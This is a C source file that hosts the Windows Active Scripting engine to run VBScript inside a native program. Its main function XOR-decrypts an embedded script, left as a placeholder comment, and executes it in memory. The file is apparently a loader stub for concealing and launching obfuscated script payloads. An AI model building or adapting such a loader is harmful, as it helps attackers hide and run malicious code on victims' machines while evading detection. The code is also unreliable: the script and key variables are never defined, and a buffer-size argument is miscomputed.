#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#include <ObjBase.h>
#include <ActivScp.h>

#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <inttypes.h>

#pragma comment(lib, "oleaut32.lib")
#pragma comment(lib, "ole32.lib")


typedef struct {
    IActiveScriptSite       site;
    IActiveScriptSiteWindow siteWnd; 
    ULONG                   m_cRef;
} MyIActiveScriptSite;

static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this);

static STDMETHODIMP QueryInterface(IActiveScriptSite *this, REFIID riid, void **ppv) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;

    if(ppv == NULL) return E_POINTER;
    
    // we implement the following interfaces
    if(IsEqualIID(&IID_IUnknown,          riid) || 
       IsEqualIID(&IID_IActiveScriptSite, riid)) 
    {
      *ppv = (LPVOID)this;
      AddRef(this);
      return S_OK;
    } 
    *ppv = NULL;
    return E_NOINTERFACE;
}

static STDMETHODIMP_(ULONG) AddRef(IActiveScriptSite *this) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
  
    _InterlockedIncrement(&mas->m_cRef);
    return mas->m_cRef;
}

static STDMETHODIMP_(ULONG) Release(IActiveScriptSite *this) {
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;
    
    ULONG ulRefCount = _InterlockedDecrement(&mas->m_cRef);  
    return ulRefCount;
}

static STDMETHODIMP GetItemInfo(IActiveScriptSite *this, 
  LPCOLESTR objectName, DWORD dwReturnMask, 
  IUnknown **objPtr, ITypeInfo **ppti) 
{
    MyIActiveScriptSite *mas = (MyIActiveScriptSite*)this;

    return S_OK;
}

static STDMETHODIMP OnScriptError(IActiveScriptSite *this, 
  IActiveScriptError *scriptError) 
{
    EXCEPINFO ei;
    DWORD     dwSourceContext = 0;
    ULONG     ulLineNumber    = 0;
    LONG      ichCharPosition = 0;
    HRESULT   hr;
    
    memset(&ei, 0, sizeof(EXCEPINFO));
    
    hr = scriptError->lpVtbl->GetExceptionInfo(scriptError, &ei);
    if(hr == S_OK) {
      hr = scriptError->lpVtbl->GetSourcePosition(
        scriptError, &dwSourceContext, 
        &ulLineNumber, &ichCharPosition);
      if(hr == S_OK) {
      }
    }
    return S_OK;

    return S_OK;
}

static STDMETHODIMP GetLCID(IActiveScriptSite *this, LCID *plcid) {
    return S_OK;
}

static STDMETHODIMP GetDocVersionString(IActiveScriptSite *this, BSTR *version) {
    return S_OK;
}

static STDMETHODIMP OnScriptTerminate(IActiveScriptSite *this, 
  const VARIANT *pvr, const EXCEPINFO *pei) 
{
    return S_OK;
}

static STDMETHODIMP OnStateChange(IActiveScriptSite *this, SCRIPTSTATE state) {
    return S_OK;
}

static STDMETHODIMP OnEnterScript(IActiveScriptSite *this) {
    return S_OK;
}

static STDMETHODIMP OnLeaveScript(IActiveScriptSite *this) {
    return S_OK;
}


VOID run_script(PWCHAR lang, PCHAR script) {
    IActiveScriptParse     *parser;
    IActiveScript          *engine;
    MyIActiveScriptSite    mas;
    IActiveScriptSiteVtbl  vft;
    LPVOID                 cs;
    DWORD                  len;
    CLSID                  langId;
    HRESULT                hr;
    OLECHAR* obj;
    
    // 1. Initialize IActiveScript based on language
    CLSIDFromProgID(lang, &langId);
    CoInitializeEx(NULL, COINIT_MULTITHREADED);
    
    CoCreateInstance(
      &langId, 0, CLSCTX_INPROC_SERVER, 
      &IID_IActiveScript, (void **)&engine);
    
    // 2. Query engine for script parser and initialize
    engine->lpVtbl->QueryInterface(
        engine, &IID_IActiveScriptParse, 
        (void **)&parser);
        
    parser->lpVtbl->InitNew(parser);
    
    // 3. Initialize IActiveScriptSite interface
    vft.QueryInterface      = (LPVOID)QueryInterface;
    vft.AddRef              = (LPVOID)AddRef;
    vft.Release             = (LPVOID)Release;
    vft.GetLCID             = (LPVOID)GetLCID;
    vft.GetItemInfo         = (LPVOID)GetItemInfo;
    vft.GetDocVersionString = (LPVOID)GetDocVersionString;
    vft.OnScriptTerminate   = (LPVOID)OnScriptTerminate;
    vft.OnStateChange       = (LPVOID)OnStateChange;
    vft.OnScriptError       = (LPVOID)OnScriptError;
    vft.OnEnterScript       = (LPVOID)OnEnterScript;
    vft.OnLeaveScript       = (LPVOID)OnLeaveScript;
    
    mas.site.lpVtbl     = (IActiveScriptSiteVtbl*)&vft;
    mas.siteWnd.lpVtbl  = NULL;
    mas.m_cRef          = 0;
    
    
    engine->lpVtbl->SetScriptSite(
        engine, (IActiveScriptSite *)&mas);
        
    // 4. Convert script to unicode and execute
    len = MultiByteToWideChar(CP_ACP, 0, script, -1, NULL, 0);
    cs = malloc(len * sizeof(WCHAR));
    len = MultiByteToWideChar(CP_ACP, 0, script, -1, cs, len * sizeof(WCHAR));
    
    parser->lpVtbl->ParseScriptText(
         parser, cs, 0, 0, 0, 0, 0, 0, 0, 0);  
    
    engine->lpVtbl->SetScriptState(
         engine, SCRIPTSTATE_CONNECTED);
    
    // 5. cleanup
    parser->lpVtbl->Release(parser);
    engine->lpVtbl->Close(engine);
    engine->lpVtbl->Release(engine);
    free(cs);
}

void decrypt(char *array, int array_size, char *secret)
{
    int i;
    for(i = 0; i < array_size; i++) {
        array[i] ^= secret[i % strlen(secret)];
    }
        
}

int main(int argc, char *argv[]) {
    wchar_t *lang;
    lang = L"VBScript";
    //SCRIPT COMES HERE
    int length = strlen(script);
    decrypt(script, length, secret);
    run_script(lang, script);
    return 0;
}